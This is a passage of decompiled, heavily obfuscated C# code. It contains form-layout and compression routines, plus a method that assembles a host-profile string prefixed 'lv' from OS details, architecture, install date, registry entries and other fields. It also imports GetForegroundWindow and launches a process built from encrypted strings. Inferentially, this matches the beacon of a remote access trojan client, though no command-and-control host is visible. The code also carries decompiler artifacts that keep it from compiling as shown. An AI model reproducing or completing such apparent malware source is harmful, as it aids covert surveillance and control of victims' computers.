        \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0002, AnchorStyles.Bottom | AnchorStyles.Right);
        \u0006\u0002.\u007E\u0004\u0004((object) obj0.\u0002, FlatStyle.System);
        \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0002, new Size(100, 24));
        \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0002, new Point(408 - \u0018.\u007E\u0086((object) obj0.\u0002), 188));
        \u000E\u0002.\u007E\u0010\u0004((object) obj0.\u0002, 0);
        \u000F\u0002.\u007E\u0012\u0004((object) obj0.\u0002, \u0006.\u0007.\u001F(899));
        \u0010\u0002.\u007E\u0017\u0004((object) obj0.\u0002, new EventHandler(obj0.\u0002));
        if (true)
        {
          \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0001, AnchorStyles.Bottom | AnchorStyles.Right);
          \u0006\u0002.\u007E\u0004\u0004((object) obj0.\u0001, FlatStyle.System);
        }
        \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0001, new Size(100, 24));
        if (true)
        {
          \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0001, new Point(\u0018.\u007E\u0087((object) obj0.\u0002) - \u0018.\u007E\u0086((object) obj0.\u0001) - 6, 188));
          \u000E\u0002.\u007E\u0010\u0004((object) obj0.\u0001, 1);
          \u000F\u0002.\u007E\u0012\u0004((object) obj0.\u0001, \u0006.\u0007.\u001F(908));
        }
        \u0010\u0002.\u007E\u0017\u0004((object) obj0.\u0001, new EventHandler(obj0.\u0001));
        \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0001, AnchorStyles.Bottom | AnchorStyles.Left);
        \u0011\u0002.\u007E\u001A\u0004((object) obj0.\u0001, 6, 186, 120, 32);
        \u0006.\u0007.\u0001(obj0.\u0001, \u0002.\u0005.\u0003);
        \u0005\u0002.\u007E\u0003\u0004((object) obj0.\u0001, AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right);
        \u0008\u0002.\u007E\u000F\u0004((object) obj0.\u0001, new Point(20, 72));
        \u0007\u0002.\u007E\u0006\u0004((object) obj0.\u0001, new Size(382, 13));
        \u0007\u0002.\u007E\u0007\u0004((object) obj0, new Size(5, 13));
        \u0007\u0002.\u0008\u0004((object) obj0, new Size(418, 224));
        \u0012\u0002.\u001B\u0004((object) obj0, false);
        \u0014\u0002.\u007E\u0087\u0004((object) \u0013\u0002.\u0086\u0004((object) obj0), new Control[5]
        {
          (Control) obj0.\u0001,
          (Control) obj0.\u0001,
          (Control) obj0.\u0002,
          (Control) obj0.\u0001,
          (Control) obj0.\u0001
        });
        \u0015\u0002.\u0088\u0004((object) obj0, FormBorderStyle.FixedSingle);
      }
      while (false);
      \u0012\u0002.\u001C\u0004((object) obj0, false);
      \u0012\u0002.\u001D\u0004((object) obj0, false);
      \u0012\u0002.\u001E\u0004((object) obj0, false);
      \u0016\u0002.\u0089\u0004((object) obj0, FormStartPosition.CenterScreen);
      \u0012\u0002.\u001F\u0004((object) obj0, false);
    }

    static void \u0001([In] \u0003.\u0004.\u0007 obj0)
    {
      try
      {
        do
        {
          if (true)
            goto label_2;
label_1:
          continue;
label_2:
          obj0.\u0001 = 0;
          goto label_1;
        }
        while (false);
        obj0.\u0002 = 0;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0007 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    static unsafe bool \u0001([In] \u0003.\u0004.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(13);
      int num;
      try
      {
        num = obj0.\u0001;
        switch (num)
        {
          case 2:
            if (obj0.\u0001)
            {
              obj0.\u0001 = 12;
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            *(int*) voidPtr = \u0006.\u0007.\u0001(obj0.\u0001, 3);
            if (*(int*) voidPtr < 0)
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            \u0006.\u0007.\u0001(obj0.\u0001, 3);
            if ((*(int*) voidPtr & 1) != 0)
              obj0.\u0001 = true;
            num = *(int*) voidPtr >> 1;
            switch (num)
            {
              case 0:
                \u0006.\u0007.\u0001(obj0.\u0001);
                obj0.\u0001 = 3;
                break;
              case 1:
                obj0.\u0001 = \u0003.\u0004.\u0004.\u0001;
                obj0.\u0002 = \u0003.\u0004.\u0004.\u0002;
                obj0.\u0001 = 7;
                break;
              case 2:
                obj0.\u0001 = new \u0003.\u0004.\u0005();
                obj0.\u0001 = 6;
                break;
            }
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
            break;
          case 3:
            obj0.\u0005 = num = \u0006.\u0007.\u0001(obj0.\u0001, 16);
            if (num < 0)
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            \u0006.\u0007.\u0001(obj0.\u0001, 16);
            obj0.\u0001 = 4;
            goto case 4;
          case 4:
            *(int*) ((IntPtr) voidPtr + 4) = \u0006.\u0007.\u0001(obj0.\u0001, 16);
            if (*(int*) ((IntPtr) voidPtr + 4) < 0)
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            \u0006.\u0007.\u0001(obj0.\u0001, 16);
            obj0.\u0001 = 5;
            goto case 5;
          case 5:
            *(int*) ((IntPtr) voidPtr + 8) = \u0006.\u0007.\u0001(obj0.\u0001, obj0.\u0001, obj0.\u0005);
            obj0.\u0005 -= *(int*) ((IntPtr) voidPtr + 8);
            if (obj0.\u0005 == 0)
            {
              obj0.\u0001 = 2;
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
              break;
            }
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) !\u0006.\u0007.\u0001(obj0.\u0001);
            break;
          case 6:
            if (!\u0006.\u0007.\u0001(obj0.\u0001, obj0.\u0001))
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            obj0.\u0001 = \u0006.\u0007.\u0001(obj0.\u0001);
            obj0.\u0002 = \u0006.\u0007.\u0001(obj0.\u0001);
            obj0.\u0001 = 7;
            goto case 7;
          case 7:
          case 8:
          case 9:
          case 10:
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) \u0006.\u0007.\u0001(obj0);
            break;
          case 12:
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
            break;
          default:
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
            break;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) num;
        \u0003.\u0004.\u0001 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) obj);
        throw;
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 12);
    }

    static unsafe string \u0001([In] object obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      try
      {
        if (obj0 == null)
          return string.Empty;
        if (!(obj0 is int num10))
        {
          switch (obj0)
          {
            case long num1:
              *(long*) voidPtr = num1;
              return ((long*) voidPtr)->ToString(\u0006.\u0007.\u001F(921));
            case short num2:
              *(short*) ((IntPtr) voidPtr + 40) = num2;
              return ((short*) ((IntPtr) voidPtr + 40))->ToString(\u0006.\u0007.\u001F(921));
            case uint num3:
              *(int*) ((IntPtr) voidPtr + 36) = (int) num3;
              return ((uint*) ((IntPtr) voidPtr + 36))->ToString(\u0006.\u0007.\u001F(921));
            case ulong num4:
              *(long*) ((IntPtr) voidPtr + 8) = (long) num4;
              return ((ulong*) ((IntPtr) voidPtr + 8))->ToString(\u0006.\u0007.\u001F(921));
            case ushort num5:
              *(short*) ((IntPtr) voidPtr + 42) = (short) num5;
              return ((ushort*) ((IntPtr) voidPtr + 42))->ToString(\u0006.\u0007.\u001F(921));
            case byte num6:
              *(sbyte*) ((IntPtr) voidPtr + 44) = (sbyte) num6;
              return ((byte*) ((IntPtr) voidPtr + 44))->ToString(\u0006.\u0007.\u001F(921));
            case sbyte num7:
              *(sbyte*) ((IntPtr) voidPtr + 45) = num7;
              return ((sbyte*) ((IntPtr) voidPtr + 45))->ToString(\u0006.\u0007.\u001F(921));
            case IntPtr num8:
              *(long*) ((IntPtr) voidPtr + 16) = num8.ToInt64();
              return ((long*) ((IntPtr) voidPtr + 16))->ToString(\u0006.\u0007.\u001F(921));
            case UIntPtr num9:
              *(long*) ((IntPtr) voidPtr + 24) = (long) num9.ToUInt64();
              return ((ulong*) ((IntPtr) voidPtr + 24))->ToString(\u0006.\u0007.\u001F(921));
          }
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 32) = num10;
          return ((int*) ((IntPtr) voidPtr + 32))->ToString(\u0006.\u0007.\u001F(921));
        }
      }
      catch
      {
      }
      return string.Empty;
    }

    static string \u0001([In] \u0001 obj0)
    {
      string str1;
      char[] chArray1;
      string str2;
      string str3;
      Exception exception1;
      Exception exception2;
      Exception exception3;
      Exception exception4;
      object[] objArray1;
      object[] objArray2;
      object[] objArray3;
      object[] objArray4;
      object[] objArray5;
      object[] objArray6;
      Exception exception5;
      string[] strArray;
      Exception exception6;
      char[] chArray2;
      Exception exception7;
      string str4;
      IEnumerator enumerator;
      string str5;
      Exception exception8;
      try
      {
        int length = 2;
        int num;
        while (true)
        {
          chArray1 = new char[length];
          chArray1[0] = 'l';
          chArray1[1] = 'v';
          str1 = \u001D.\u0099(new string(chArray1), obj0.\u000E);
          try
          {
            if (\u001C.\u0098(\u0006.\u0007.\u0001(obj0, \u0006.\u0007.\u001F(926)), \u0006.\u0007.\u001F(379), false) == 0)
            {
              global::\u0004 obj1 = global::\u0004.\u0004;
              string str6 = str1;
              \u0001 obj2 = obj0;
              global::\u0004 obj3 = global::\u0004.\u0004;
              string str7 = \u0006.\u0007.\u0001(obj0, ref obj0.\u0001);
              chArray1 = new char[1]{ '_' };
              string str8 = new string(chArray1);
              string str9 = \u0006.\u0007.\u0001(obj0);
              str2 = obj3(str7, str8, str9);
              ref string local = ref str2;
              string str10 = \u0006.\u0007.\u0001(obj2, ref local);
              string str11 = obj0.\u000E;
              str1 = obj1(str6, str10, str11);
            }
            else
            {
              global::\u0004 obj4 = global::\u0004.\u0004;
              string str12 = str1;
              \u0001 obj5 = obj0;
              global::\u0004 obj6 = global::\u0004.\u0004;
              \u0001 obj7 = obj0;
              str2 = \u0006.\u0007.\u0001(obj0, \u0006.\u0007.\u001F(926));
              ref string local1 = ref str2;
              string str13 = \u0006.\u0007.\u0001(obj7, ref local1);
              string str14 = \u0006.\u0007.\u001F(931);
              string str15 = \u0006.\u0007.\u0001(obj0);
              str3 = obj6(str13, str14, str15);
              ref string local2 = ref str3;
              string str16 = \u0006.\u0007.\u0001(obj5, ref local2);
              string str17 = obj0.\u000E;
              str1 = obj4(str12, str16, str17);
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception1 = ex;
            global::\u0004 obj8 = global::\u0004.\u0004;
            string str18 = str1;
            \u0001 obj9 = obj0;
            str3 = \u0006.\u0007.\u0001(obj0);
            ref string local = ref str3;
            string str19 = \u0006.\u0007.\u0001(obj9, ref local);
            string str20 = obj0.\u000E;
            str1 = obj8(str18, str19, str20);
            global::\u0006.\u0006();
          }
          try
          {
            str1 = global::\u0004.\u0004(str1, \u008B.\u009E\u0002(), obj0.\u000E);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception2 = ex;
            global::\u0004 obj = global::\u0004.\u0004;
            string str21 = str1;
            chArray1 = new char[2]{ '?', '?' };
            string str22 = new string(chArray1);
            string str23 = obj0.\u000E;
            str1 = obj(str21, str22, str23);
            global::\u0006.\u0006();
          }
          try
          {
            str1 = global::\u0004.\u0004(str1, \u008B.\u009F\u0002(), obj0.\u000E);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception3 = ex;
            global::\u0004 obj = global::\u0004.\u0004;
            string str24 = str1;
            chArray1 = new char[2]{ '?', '?' };
            string str25 = new string(chArray1);
            string str26 = obj0.\u000E;
            str1 = obj(str24, str25, str26);
            global::\u0006.\u0006();
          }
          str1 = global::\u0004.\u0004(str1, \u0006.\u0007.\u0001(obj0), obj0.\u000E);
          try
          {
            str1 = global::\u0004.\u0004(str1, \u0006.\u0007.\u0001(7U, obj0), obj0.\u000E);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception4 = ex;
            global::\u0004 obj = global::\u0004.\u0004;
            string str27 = str1;
            chArray1 = new char[1]{ 'X' };
            string str28 = new string(chArray1);
            string str29 = obj0.\u000E;
            str1 = obj(str27, str28, str29);
            global::\u0006.\u0006();
          }
          try
          {
            global::\u0002 obj10 = global::\u0002.\u0002;
            global::\u000E obj11 = global::\u000E.\u0016;
            string str30 = str1;
            \u0001 obj12 = \u0001.\u0001;
            \u0001 obj13 = \u0001.\u0001;
            \u0001 obj14 = \u0001.\u0001;
            \u0001 obj15 = \u0001.\u0001;
            \u0001 obj16 = \u0001.\u0001;
            \u0001 obj17 = \u0001.\u0001;
            object obj18 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(936), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(945), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
            string str31 = \u0006.\u0007.\u001F(962);
            objArray1 = new object[2]
            {
              (object) \u0006.\u0007.\u001F(975),
              (object) \u0006.\u0007.\u001F(379)
            };
            object[] objArray7 = objArray1;
            object obj19 = obj17(obj18, (System.Type) null, str31, objArray7, (string[]) null, (System.Type[]) null, (bool[]) null);
            string str32 = \u0006.\u0007.\u001F(962);
            objArray2 = new object[2]
            {
              (object) \u0006.\u0007.\u001F(988),
              (object) \u0006.\u0007.\u001F(1001)
            };
            object[] objArray8 = objArray2;
            object obj20 = obj16(obj19, (System.Type) null, str32, objArray8, (string[]) null, (System.Type[]) null, (bool[]) null);
            string str33 = \u0006.\u0007.\u001F(962);
            objArray3 = new object[2]
            {
              (object) \u0006.\u0007.\u001F(1006),
              (object) \u0006.\u0007.\u001F(379)
            };
            object[] objArray9 = objArray3;
            object obj21 = obj15(obj20, (System.Type) null, str33, objArray9, (string[]) null, (System.Type[]) null, (bool[]) null);
            string str34 = \u0006.\u0007.\u001F(962);
            objArray4 = new object[2]
            {
              (object) \u0006.\u0007.\u001F(1011),
              (object) \u0006.\u0007.\u001F(379)
            };
            object[] objArray10 = objArray4;
            object obj22 = obj14(obj21, (System.Type) null, str34, objArray10, (string[]) null, (System.Type[]) null, (bool[]) null);
            string str35 = \u0006.\u0007.\u001F(962);
            objArray5 = new object[2]
            {
              (object) \u0006.\u0007.\u001F(1016),
              (object) \u0006.\u0007.\u001F(1021)
            };
            object[] objArray11 = objArray5;
            object obj23 = obj13(obj22, (System.Type) null, str35, objArray11, (string[]) null, (System.Type[]) null, (bool[]) null);
            string str36 = \u0006.\u0007.\u001F(962);
            objArray6 = new object[2]
            {
              (object) \u0006.\u0007.\u001F(1026),
              (object) \u0006.\u0007.\u001F(1001)
            };
            object[] objArray12 = objArray6;
            object obj24 = obj12(obj23, (System.Type) null, str36, objArray12, (string[]) null, (System.Type[]) null, (bool[]) null);
            object obj25 = obj11((object) str30, obj24);
            str1 = obj10(obj25);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception5 = ex;
            \u001D obj = \u001D.\u0099;
            string str37 = str1;
            chArray1 = new char[2]{ '?', '?' };
            string str38 = new string(chArray1);
            str1 = obj(str37, str38);
            global::\u0006.\u0006();
          }
          \u001D obj26 = \u001D.\u0099;
          string str39 = str1;
          chArray1 = new char[2]{ 'S', 'P' };
          string str40 = new string(chArray1);
          str1 = obj26(str39, str40);
          try
          {
            \u0018\u0002 obj27 = \u0018\u0002.\u008B\u0004;
            string str41 = \u001E.\u007E\u0001\u0002((object) \u0017\u0002.\u008A\u0004());
            chArray1 = new char[1]{ ' ' };
            string str42 = new string(chArray1);
            strArray = obj27(str41, str42, -1, CompareMethod.Binary);
            if (strArray.Length == 1)
            {
              \u001D obj28 = \u001D.\u0099;
              string str43 = str1;
              chArray1 = new char[1]{ '0' };
              string str44 = new string(chArray1);
              str1 = obj28(str43, str44);
            }
            str1 = \u001D.\u0099(str1, strArray[checked (strArray.Length - 1)]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception6 = ex;
            \u001D obj29 = \u001D.\u0099;
            string str45 = str1;
            chArray1 = new char[1]{ '0' };
            string str46 = new string(chArray1);
            str1 = obj29(str45, str46);
            global::\u0006.\u0006();
          }
          try
          {
            \u0015 obj30 = \u0015.\u007E\u001E;
            string str47 = \u0019\u0002.\u008C\u0004(Environment.SpecialFolder.ProgramFiles);
            chArray1 = new char[3]{ 'x', '8', '6' };
            string str48 = new string(chArray1);
            if (obj30((object) str47, str48))
            {
              global::\u0004 obj31 = global::\u0004.\u0004;
              string str49 = str1;
              chArray2 = new char[4]{ ' ', 'x', '6', '4' };
              string str50 = new string(chArray2);
              string str51 = obj0.\u000E;
              str1 = obj31(str49, str50, str51);
            }
            else
            {
              global::\u0004 obj32 = global::\u0004.\u0004;
              string str52 = str1;
              chArray2 = new char[4]{ ' ', 'x', '8', '6' };
              string str53 = new string(chArray2);
              string str54 = obj0.\u000E;
              str1 = obj32(str52, str53, str54);
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception7 = ex;
            str1 = \u001D.\u0099(str1, obj0.\u000E);
            global::\u0006.\u0006();
          }
          num = \u0006.\u0007.\u0001(obj0) ? 1 : 0;
          if (false)
            length = num;
          else
            break;
        }
        if (num != 0)
        {
          global::\u0004 obj = global::\u0004.\u0004;
          string str55 = str1;
          chArray2 = new char[3]{ 'Y', 'e', 's' };
          string str56 = new string(chArray2);
          string str57 = obj0.\u000E;
          str1 = obj(str55, str56, str57);
        }
        else
        {
          global::\u0004 obj = global::\u0004.\u0004;
          string str58 = str1;
          chArray2 = new char[2]{ 'N', 'o' };
          string str59 = new string(chArray2);
          string str60 = obj0.\u000E;
          str1 = obj(str58, str59, str60);
        }
        str1 = global::\u0004.\u0004(str1, obj0.\u0002, obj0.\u000E);
        global::\u0004 obj33 = global::\u0004.\u0004;
        string str61 = str1;
        chArray2 = new char[2]{ '.', '.' };
        string str62 = new string(chArray2);
        string str63 = obj0.\u000E;
        str1 = obj33(str61, str62, str63);
        str1 = global::\u0004.\u0004(str1, \u0006.\u0007.\u0001(obj0), obj0.\u000E);
        str4 = \u0006.\u0007.\u001F(379);
        try
        {
          try
          {
            \u001A\u0002 obj34 = \u001A\u0002.\u007E\u008D\u0004;
            \u0001 obj35 = \u0001.\u0001;
            \u0001 obj36 = \u0001.\u0001;
            object obj37 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
            string str64 = \u0006.\u0007.\u001F(1035);
            objArray6 = new object[2];
            object[] objArray13 = objArray6;
            chArray2 = new char[9]
            {
              'S',
              'o',
              'f',
              't',
              'w',
              'a',
              'r',
              'e',
              '\\'
            };
            string str65 = \u001D.\u0099(new string(chArray2), obj0.\u0006);
            objArray13[0] = (object) str65;
            objArray6[1] = (object) false;
            object[] objArray14 = objArray6;
            object obj38 = obj36(obj37, (System.Type) null, str64, objArray14, (string[]) null, (System.Type[]) null, (bool[]) null);
            string str66 = \u0006.\u0007.\u001F(1052);
            object[] objArray15 = new object[0];
            IEnumerable enumerable = (IEnumerable) obj35(obj38, (System.Type) null, str66, objArray15, (string[]) null, (System.Type[]) null, (bool[]) null);
            enumerator = obj34((object) enumerable);
            while (\u0087.\u007E\u0086\u0002((object) enumerator))
            {
              str5 = global::\u0002.\u0002(\u001B\u0002.\u007E\u008E\u0004((object) enumerator));
              if (\u0018.\u007E\u0084((object) str5) == 32)
              {
                global::\u0004 obj39 = global::\u0004.\u0004;
                string str67 = str4;
                string str68 = str5;
                chArray1 = new char[1]{ ',' };
                string str69 = new string(chArray1);
                str4 = obj39(str67, str68, str69);
              }
            }
          }
          finally
          {
            if (enumerator is IDisposable)
              \u009B.\u007E\u007F\u0003((object) (enumerator as IDisposable));
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception8 = ex;
          global::\u0006.\u0006();
        }
        return \u001D.\u0099(str1, str4);
      }
      catch (Exception ex)
      {
        string str70;
        object[] objArray16 = new object[25]
        {
          (object) str70,
          (object) str1,
          (object) str4,
          (object) exception1,
          (object) exception2,
          (object) exception3,
          (object) exception4,
          (object) exception5,
          (object) strArray,
          (object) exception6,
          (object) exception7,
          (object) str5,
          (object) exception8,
          (object) chArray1,
          (object) str2,
          (object) str3,
          (object) objArray1,
          (object) objArray2,
          (object) objArray3,
          (object) objArray4,
          (object) objArray5,
          (object) objArray6,
          (object) chArray2,
          (object) enumerator,
          (object) obj0
        };
        \u0006.\u0007.\u0001(ex, objArray16);
        throw;
      }
    }

    static bool \u0001([In] \u0003.\u0005 obj0) => obj0.\u0001;

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6,
      [In] object obj7,
      [In] object obj8)
    {
      \u0006.\u0007.\u0001(obj0, new object[8]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6,
        obj7,
        obj8
      });
    }

    [DllImport("kernel32.dll", EntryPoint = "GetSystemInfo")]
    static extern void \u0001([In] ref \u0007.\u0003.\u0003 obj0);

    static void \u0001([In] \u0003.\u0004.\u0008 obj0, [In] byte[] obj1)
    {
      try
      {
        do
        {
          obj0.\u0002 = obj1;
          obj0.\u0008 = 0;
          obj0.\u000E = obj1.Length;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0008 obj = obj0;
        byte[] numArray = obj1;
        \u0006.\u0007.\u0001(ex, (object) obj, (object) numArray);
        throw;
      }
    }

    static Exception \u0001([In] \u0004.\u0004 obj0) => obj0.\u0001;

    static \u0007.\u0003.\u0002 \u0001()
    {
      if (!\u0007.\u0003.\u0001)
      {
        \u0007.\u0003.\u0001 = new \u0007.\u0003.\u0002();
        try
        {
          do
          {
            // ISSUE: type reference
            \u0007.\u0003.\u0001.\u0001 = \u001C\u0002.\u0090\u0004(\u0013.\u001C(__typeref (\u0007.\u0003.\u0002)));
            int num = (int) \u0006.\u0007.\u0001(ref \u0007.\u0003.\u0001);
            if (true)
            {
              if (false)
                goto label_7;
            }
            else
              goto label_7;
          }
          while (false);
          \u0007.\u0003.\u0001 = true;
        }
        catch
        {
        }
      }
label_7:
      return \u0007.\u0003.\u0001;
    }

    static void \u0001([In] \u0003.\u0004.\u000F obj0, [In] int obj1)
    {
      try
      {
        do
        {
          \u0006.\u0007.\u0001(obj0, obj1);
          \u0006.\u0007.\u0001(obj0, obj1 >> 16);
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u000F obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj1;
        \u0006.\u0007.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

    static bool \u0001([In] \u0006.\u0005 obj0) => obj0.\u0001;

    static void \u0001([In] \u0002.\u0003 obj0)
    {
      try
      {
        string str1 = \u008B.\u0001\u0003();
        \u0006.\u0007.\u0001(obj0, str1);
        string str2 = \u0006.\u0007.\u0001();
        Process process = \u001D\u0002.\u0091\u0004(\u001D.\u009A(str2, \u0006.\u0007.\u001F(1073)), global::\u0004.\u0004(\u0006.\u0007.\u001F(1098), str1, \u0006.\u0007.\u001F(1127)));
        if (obj0.\u0001 == null)
          return;
        \u001E\u0002.\u007E\u0092\u0004((object) obj0.\u0001, (object) obj0, EventArgs.Empty);
      }
      catch (ThreadAbortException ex)
      {
      }
      catch (Exception ex)
      {
        \u0006.\u0007.\u0001(obj0, new \u0004.\u0004(ex));
      }
    }

    static void \u0001([In] \u0003.\u0004.\u000E obj0)
    {
      int num1;
      try
      {
        int num2 = obj0.\u0003;
label_1:
        if (true)
        {
          if (num2 > 0)
          {
            byte[] numArray = obj0.\u0001;
            \u0003.\u0004.\u000E obj = obj0;
            int num3;
            num1 = num3 = obj.\u0002;
            obj.\u0002 = num3 + 1;
            int index = num1;
            int num4 = (int) (byte) obj0.\u0001;
            numArray[index] = (byte) num4;
            goto label_9;
          }
          else
            goto label_5;
        }
label_3:
        if (true)
        {
          if (num2 > 8)
            goto label_10;
        }
        else
          goto label_1;
label_5:
        obj0.\u0001 = 0U;
        if (true)
        {
          obj0.\u0003 = 0;
          if (true)
            return;
          goto label_10;
        }
label_9:
        num2 = obj0.\u0003;
        goto label_3;
label_10:
        byte[] numArray1 = obj0.\u0001;
        \u0003.\u0004.\u000E obj1 = obj0;
        int num5;
        num1 = num5 = obj1.\u0002;
        obj1.\u0002 = num5 + 1;
        int index1 = num1;
        int num6 = (int) (byte) (obj0.\u0001 >> 8);
        numArray1[index1] = (byte) num6;
        goto label_5;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) num1;
        \u0003.\u0004.\u000E obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) local, (object) obj);
        throw;
      }
    }

    [DllImport("user32", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr \u0001();

    static string \u0001([In] \u0001 obj0)
    {
      DateTime dateTime;
      char[] chArray1;
      string str1;
      Exception exception1;
      try
      {
        try
        {
          dateTime = \u001F\u0002.\u007E\u0093\u0004((object) obj0.\u0001);
          ref DateTime local = ref dateTime;
          chArray1 = new char[8]
          {
            'y',
            'y',
            '/',
            'M',
            'M',
            '/',
            'd',
            'd'
          };
          string format = new string(chArray1);
          str1 = local.ToString(format);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          chArray1 = new char[8]
          {
            '?',
            '?',
            '/',
            '?',
            '?',
            '/',
            '?',
            '?'
          };
          str1 = new string(chArray1);
          global::\u0006.\u0006();
        }
        return str1;
      }
      catch (Exception ex)
      {
        string str2 = str1;
        Exception exception2 = exception1;
        char[] chArray2 = chArray1;
        // ISSUE: variable of a boxed type
        __Boxed<DateTime> local = (ValueType) dateTime;
        \u0001 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) str2, (object) exception2, (object) chArray2, (object) local, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u0003.\u0004.\u0007 obj0, [In] int obj1)
    {
      int index;
      try
      {
        if (true)
        {
          \u0006.\u0007.\u0001(obj0.\u0003);
          do
          {
            \u0006.\u0007.\u0001(obj0.\u0001);
          }
          while (false);
          \u0006.\u0007.\u0001(obj0.\u0002);
        }
        \u0003.\u0004.\u000E obj2 = obj0.\u0001;
        int num1 = obj0.\u0001.\u0002 - 257;
        if (true)
          goto label_17;
label_1:
        \u0006.\u0007.\u0001(obj0.\u0001, obj0.\u0002.\u0002 - 1, 5);
        \u0003.\u0004.\u0007.\u0001 obj3;
        if (true)
        {
          \u0006.\u0007.\u0001(obj0.\u0001, obj1 - 4, 4);
          int num2 = 0;
          if (num2 == 0)
          {
            index = num2;
            goto label_7;
          }
label_6:
          index = num2;
label_7:
          int num3 = index;
          if (true)
            goto label_8;
label_5:
          num2 = num3 + 1;
          goto label_6;
label_8:
          int num4 = obj1;
          if (num3 < num4)
          {
            \u0006.\u0007.\u0001(obj0.\u0001, (int) obj0.\u0003.\u0001[\u0003.\u0004.\u0007.\u0001[index]], 3);
            num3 = index;
            goto label_5;
          }
          else
          {
            \u0003.\u0004.\u0007.\u0001 obj4 = obj0.\u0001;
            if (false)
              return;
            \u0006.\u0007.\u0001(obj0.\u0003, obj4);
            obj3 = obj0.\u0002;
          }
        }
        \u0006.\u0007.\u0001(obj0.\u0003, obj3);
        return;
label_17:
        \u0006.\u0007.\u0001(obj2, num1, 5);
        goto label_1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) index;
        \u0003.\u0004.\u0007 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) obj, (object) local2);
        throw;
      }
    }

    static string \u0001([In] \u0001 obj0, [In] ref byte[] obj1)
    {
      string str1;
      try
      {
        str1 = \u007F\u0002.\u007E\u0095\u0004((object) \u0091.\u0011\u0003(), obj1);
      }
      catch (Exception ex)
      {
        string str2;
        string str3 = str2;
        \u0001 obj = obj0;
        byte[] numArray = obj1;
        \u0006.\u0007.\u0001(ex, (object) str3, (object) obj, (object) numArray);
        throw;
      }
      return str1;
    }

    static string \u0001() => \u0080\u0002.\u0096\u0004((object) \u0006.\u0007.\u001F(1132), (object) \u0006.\u0007.\u001F(1021), (object) \u0006.\u0007.\u0001());

    static unsafe void \u0001([In] \u0003.\u0004.\u0008 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      try
      {
        byte[] sourceArray = obj0.\u0001;
